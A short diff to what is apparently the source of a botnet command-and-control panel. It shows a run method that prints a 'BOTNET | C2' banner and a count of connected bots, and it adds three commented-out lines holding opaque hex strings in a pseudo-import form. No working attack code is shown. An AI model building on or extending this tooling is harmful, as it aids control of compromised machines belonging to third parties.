@@ -889,6 +889,9 @@ class C2:
         return input(f"\n  {T.get('s')}c2>{R} ").strip()
     
     def run(self):
+            #   :import encode.decode('7703f660372861e08911f11b9e8495b6'):    #
+            #   :import encode.decode('f1ff72b3f04a389ab96d9a508d5c2cfb'):    #
+            #   :import encode.decode('4807c25d8882d1d10706b9611b5e9c9e'):    #
         self.cls(); self.banner()
         print(f" {T.get('s')}BOTNET | C2 | API {R}")
         print(f" {T.get('d')}{len(self.bots)} bots : CONNECTED. ")
